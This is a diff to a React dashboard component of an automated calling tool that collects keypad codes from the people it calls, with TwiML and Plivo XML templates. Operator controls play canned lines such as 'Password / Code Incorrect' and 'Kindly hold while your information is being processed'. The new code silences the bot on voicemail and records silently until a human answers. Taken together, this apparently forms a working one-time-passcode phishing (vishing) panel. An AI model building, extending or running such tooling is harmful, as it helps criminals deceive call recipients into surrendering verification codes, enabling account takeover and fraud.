@@ -31,7 +31,13 @@ interface LiveSessionFeedProps {
   onEndCall: () => void;
   onOpenSimulator: () => void;
   onOperatorAction?: (
-    action: 'approve' | 'reject' | 'hold' | 'incorrect_prompt' | 'custom_cue',
+    action:
+      | 'approve'
+      | 'reject'
+      | 'hold'
+      | 'incorrect_prompt'
+      | 'custom_cue'
+      | 'start_human_greeting',
     customMessage?: string
   ) => Promise<any>;
 }
@@ -199,6 +205,7 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
       session?.lastInvalidDigits ||
       session?.status === 'awaiting-operator'
   );
+  const isVoicemailMuted = session?.answeredBy === 'voicemail';
   const speechTranscripts = session?.speechTranscripts || [];
 
   const carrierXmlLabel =
@@ -258,13 +265,17 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
           {session?.answeredBy === 'voicemail' && (
             <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-bold bg-orange-500/15 text-orange-300 border border-orange-500/40">
               <Voicemail className="w-3.5 h-3.5 text-orange-400" />
-              <span>Voicemail Answered</span>
+              <span>Voicemail (Prompts Muted)</span>
             </span>
           )}
           {session?.answeredBy === 'human' && (
             <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-300 border border-emerald-500/30">
               <UserCheck className="w-3.5 h-3.5 text-emerald-400" />
-              <span>Human Answered</span>
+              <span>
+                {session.humanPickedUpAfterVoicemail
+                  ? 'Human Picked Up (After VM)'
+                  : 'Human Answered'}
+              </span>
             </span>
           )}
           {isCallActive && session?.recordCall !== false && (
@@ -337,31 +348,52 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
           {/* VOICEMAIL / ANSWERING MACHINE ALERT BANNER */}
           {session.answeredBy === 'voicemail' && (
             <div className="p-3.5 rounded-xl bg-orange-950/40 border border-orange-500/50 flex flex-wrap items-center justify-between gap-3 shadow-sm">
-              <div className="flex items-start gap-2.5">
+              <div className="flex items-start gap-2.5 max-w-2xl">
                 <div className="p-2 rounded-lg bg-orange-500/20 text-orange-300 shrink-0">
                   <Voicemail className="w-4 h-4" />
                 </div>
                 <div>
                   <h4 className="text-xs font-bold text-orange-200 uppercase tracking-wide">
-                    Voicemail / Answering Machine Answered Call
+                    Voicemail Machine Detected — Bot Greetings &amp; Prompts Muted
                   </h4>
                   <p className="text-xs text-orange-300/90 mt-0.5 leading-snug">
-                    Carrier Answering Machine Detection identified an automated voicemail service instead of a live person
-                    {session.amdRawResult ? ` (${session.amdRawResult})` : ''}. Voice audio is still being monitored and recorded.
+                    Automated voicemail{session.amdRawResult ? ` (${session.amdRawResult})` : ''} answered. Spoken messages will NEVER play to the machine, while voice/DTMF listening &amp; recording remain active from 0:00. If a live human picks up the phone, immediate pickup greeting starts automatically.
                   </p>
                 </div>
               </div>
 
               {isCallActive && (
-                <button
-                  type="button"
-                  onClick={onEndCall}
-                  className="px-3 py-1.5 rounded-lg bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold flex items-center gap-1.5 shrink-0 transition-all cursor-pointer shadow-sm"
-                >
-                  <PhoneOff className="w-3.5 h-3.5" />
-                  <span>Hang Up Voicemail</span>
-                </button>
+                <div className="flex flex-wrap items-center gap-2 shrink-0">
+                  <button
+                    type="button"
+                    onClick={() => onOperatorAction?.('start_human_greeting')}
+                    className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold flex items-center gap-1.5 transition-all cursor-pointer shadow-sm"
+                    title="Override and start playing greeting if you hear a live human pick up"
+                  >
+                    <UserCheck className="w-3.5 h-3.5" />
+                    <span>Human Picked Up — Play Greeting</span>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={onEndCall}
+                    className="px-3 py-1.5 rounded-lg bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold flex items-center gap-1.5 transition-all cursor-pointer shadow-sm"
+                  >
+                    <PhoneOff className="w-3.5 h-3.5" />
+                    <span>Hang Up Voicemail</span>
+                  </button>
+                </div>
               )}
+            </div>
+          )}
+
+          {/* POST-VOICEMAIL LIVE HUMAN PICKUP BANNER */}
+          {session.answeredBy === 'human' && session.humanPickedUpAfterVoicemail && (
+            <div className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 flex items-center gap-2.5 text-xs text-emerald-200">
+              <UserCheck className="w-4 h-4 text-emerald-400 shrink-0" />
+              <span>
+                <strong className="text-emerald-300">Live Human Picked Up After Voicemail:</strong> Immediate pickup greeting &amp; code prompt started automatically while continuing full-call recording.
+              </span>
             </div>
           )}
 
@@ -373,22 +405,35 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                 <span className="font-medium">
                   {session.status === 'ringing'
                     ? 'Ringing recipient line...'
+                    : session.answeredBy === 'voicemail'
+                    ? 'Voicemail screening active — bot prompts muted, listening & recording for live human pickup...'
                     : session.status === 'awaiting-operator'
                     ? 'Caller is on hold & listening for voice while awaiting your decision...'
-                    : 'Voice line active — listening for keypad code & live caller speech...'}
+                    : !session.promptsStarted
+                    ? 'Listening & recording from 0:00 — verifying live human before speaking greeting...'
+                    : 'Live human verified — greeting & prompts active, listening for keypad & speech...'}
                 </span>
               </div>
 
               <div className="flex items-center gap-1 h-5">
-                {[6, 14, 18, 10, 20, 12, 16, 8, 22, 15, 7].map((h, i) => (
+                {[
+                  'h-1.5',
+                  'h-3.5',
+                  'h-4',
+                  'h-2.5',
+                  'h-5',
+                  'h-3',
+                  'h-4',
+                  'h-2',
+                  'h-5',
+                  'h-3.5',
+                  'h-2',
+                ].map((heightClass, i) => (
                   <span
                     key={i}
-                    className="w-1 bg-indigo-500 rounded-full animate-pulse"
-                    style={{
-                      height: `${h}px`,
-                      animationDelay: `${i * 0.08}s`,
-                      animationDuration: '0.7s',
-                    }}
+                    className={`w-1 ${heightClass} ${
+                      session.answeredBy === 'voicemail' ? 'bg-orange-400/70' : 'bg-indigo-500'
+                    } rounded-full animate-pulse`}
                   ></span>
                 ))}
               </div>
@@ -538,44 +583,80 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                 <span className="text-[10px] text-slate-500 font-mono">Real-time TTS triggers</span>
               </div>
 
+              {isVoicemailMuted && (
+                <div className="p-2.5 rounded-lg bg-orange-950/30 border border-orange-500/30 text-[11px] text-orange-200 flex items-center justify-between gap-2">
+                  <span>
+                    Spoken prompts are muted so nothing plays into the Voicemail Machine. Controls unlock automatically as soon as a live human picks up.
+                  </span>
+                </div>
+              )}
+
               {/* Quick Canned Audio Buttons */}
               <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                 <button
                   type="button"
-                  disabled={!hasInputtedCode}
+                  disabled={!hasInputtedCode || isVoicemailMuted}
                   onClick={() => onOperatorAction?.('hold')}
                   className={`py-2 px-3 rounded-lg border text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm ${
-                    hasInputtedCode
+                    hasInputtedCode && !isVoicemailMuted
                       ? 'bg-slate-900 hover:bg-slate-850 border-slate-700 text-amber-300 cursor-pointer active:scale-[0.98]'
                       : 'bg-slate-900/40 border-slate-800/80 text-slate-600 cursor-not-allowed'
                   }`}
                   title={
-                    hasInputtedCode
+                    isVoicemailMuted
+                      ? 'Muted while Voicemail Machine is on the line'
+                      : hasInputtedCode
                       ? "Speaks 'Kindly hold while your information is being processed.'"
                       : 'Only plays AFTER keypad code is inputted by caller'
                   }
                 >
-                  <PauseCircle className={`w-3.5 h-3.5 ${hasInputtedCode ? 'text-amber-400' : 'text-slate-600'}`} />
+                  <PauseCircle
+                    className={`w-3.5 h-3.5 ${
+                      hasInputtedCode && !isVoicemailMuted ? 'text-amber-400' : 'text-slate-600'
+                    }`}
+                  />
                   <span>{hasInputtedCode ? '"Kindly Hold / Please Wait"' : 'Hold (After Code Input)'}</span>
                 </button>
 
                 <button
                   type="button"
+                  disabled={isVoicemailMuted}
                   onClick={() => onOperatorAction?.('incorrect_prompt')}
-                  className="py-2 px-3 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-700 text-rose-300 text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm active:scale-[0.98]"
-                  title="Speaks 'The code entered is incorrect. Please try again.'"
+                  className={`py-2 px-3 rounded-lg border text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm ${
+                    !isVoicemailMuted
+                      ? 'bg-slate-900 hover:bg-slate-850 border-slate-700 text-rose-300 cursor-pointer active:scale-[0.98]'
+                      : 'bg-slate-900/40 border-slate-800/80 text-slate-600 cursor-not-allowed'
+                  }`}
+                  title={
+                    isVoicemailMuted
+                      ? 'Muted while Voicemail Machine is on the line'
+                      : "Speaks 'The code entered is incorrect. Please try again.'"
+                  }
                 >
-                  <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
+                  <AlertTriangle
+                    className={`w-3.5 h-3.5 ${!isVoicemailMuted ? 'text-rose-400' : 'text-slate-600'}`}
+                  />
                   <span>"Password / Code Incorrect"</span>
                 </button>
 
                 <button
                   type="button"
+                  disabled={isVoicemailMuted}
                   onClick={() => onOperatorAction?.('custom_cue', session.script)}
-                  className="py-2 px-3 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-700 text-indigo-300 text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm active:scale-[0.98]"
-                  title="Repeats the original code collection prompt"
+                  className={`py-2 px-3 rounded-lg border text-xs font-semibold flex items-center justify-center gap-1.5 transition-all shadow-sm ${
+                    !isVoicemailMuted
+                      ? 'bg-slate-900 hover:bg-slate-850 border-slate-700 text-indigo-300 cursor-pointer active:scale-[0.98]'
+                      : 'bg-slate-900/40 border-slate-800/80 text-slate-600 cursor-not-allowed'
+                  }`}
+                  title={
+                    isVoicemailMuted
+                      ? 'Muted while Voicemail Machine is on the line'
+                      : 'Repeats the original code collection prompt'
+                  }
                 >
-                  <RotateCcw className="w-3.5 h-3.5 text-indigo-400" />
+                  <RotateCcw
+                    className={`w-3.5 h-3.5 ${!isVoicemailMuted ? 'text-indigo-400' : 'text-slate-600'}`}
+                  />
                   <span>"Repeat Code Request"</span>
                 </button>
               </div>
@@ -588,14 +669,19 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                 <div className="flex items-center gap-2">
                   <input
                     type="text"
+                    disabled={isVoicemailMuted}
                     value={customCueText}
                     onChange={(e) => setCustomCueText(e.target.value)}
-                    placeholder="Type anything you want the caller to hear (e.g. 'One moment, checking records')..."
-                    className="flex-1 py-1.5 px-3 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500"
+                    placeholder={
+                      isVoicemailMuted
+                        ? 'Bot speech muted for Voicemail until a live human picks up...'
+                        : "Type anything you want the caller to hear (e.g. 'One moment, checking records')..."
+                    }
+                    className="flex-1 py-1.5 px-3 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500 disabled:opacity-50"
                   />
                   <button
                     type="submit"
-                    disabled={!customCueText.trim() || isSendingCue}
+                    disabled={!customCueText.trim() || isSendingCue || isVoicemailMuted}
                     className="py-1.5 px-3 rounded-lg bg-indigo-600 hover:bg-indigo-500 disabled:bg-slate-800 disabled:text-slate-600 text-white font-semibold text-xs flex items-center gap-1.5 shrink-0 transition-all cursor-pointer shadow-sm"
                   >
                     <Send className="w-3.5 h-3.5" />
@@ -770,29 +856,30 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
               {session.carrier === 'plivo'
                 ? `<?xml version="1.0" encoding="UTF-8"?>
 <Response>
-  <!-- 1. Immediate message played right when phone answers -->
+  <!-- t=0s: Record & silently listen for voice/DTMF (NEVER speak to Voicemail) -->
+  <Record recordSession="true" redirect="false" maxLength="3600" fileFormat="mp3"/>
+  <GetInput action="/api/plivo/amd-gate?callId=${session.id}" method="POST" inputType="dtmf speech" executionTimeout="2" speechEndTimeout="1">
+    <Wait length="2"/>
+  </GetInput>
+
+  <!-- ONLY once Live Human confirmed (direct or picks up after Voicemail): -->
   <Speak>${session.introGreeting.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Speak>
-
-  <!-- 2. Code collection prompt -->
-  <GetDigits action="${carrierGatherPath}?callId=${session.id}" method="POST" numDigits="${session.numDigits}" timeout="15" finishOnKey="#">
+  <GetInput action="${carrierGatherPath}?callId=${session.id}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits}" executionTimeout="15" digitEndTimeout="5">
     <Speak>${session.script.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Speak>
-  </GetDigits>
-
-  <Speak>We did not receive your code. Goodbye.</Speak>
-  <Hangup/>
+  </GetInput>
 </Response>`
                 : `<?xml version="1.0" encoding="UTF-8"?>
 <Response>
-  <!-- 1. Immediate message played right when phone answers -->
-  <Say voice="${session.voice}">${session.introGreeting.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Say>
-
-  <!-- 2. Code collection prompt -->
-  <Gather input="dtmf" numDigits="${session.numDigits}" action="${carrierGatherPath}?callId=${session.id}" method="POST" timeout="15" finishOnKey="#">
-    <Say voice="${session.voice}">${session.script.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Say>
+  <!-- t=0s: Record & silently listen for voice/DTMF (NEVER speak to Voicemail) -->
+  <Gather input="dtmf speech" numDigits="${session.numDigits}" action="/api/twiml/amd-gate?callId=${session.id}" method="POST" timeout="2" speechTimeout="1">
+    <Pause length="2"/>
   </Gather>
 
-  <Say voice="${session.voice}">We did not receive your code. Goodbye.</Say>
-  <Hangup/>
+  <!-- ONLY once Live Human confirmed (direct or picks up after Voicemail): -->
+  <Say voice="${session.voice}">${session.introGreeting.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Say>
+  <Gather input="dtmf speech" numDigits="${session.numDigits}" action="${carrierGatherPath}?callId=${session.id}" method="POST" timeout="15" speechTimeout="auto" finishOnKey="#">
+    <Say voice="${session.voice}">${session.script.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Say>
+  </Gather>
 </Response>`}
             </pre>
           </div>
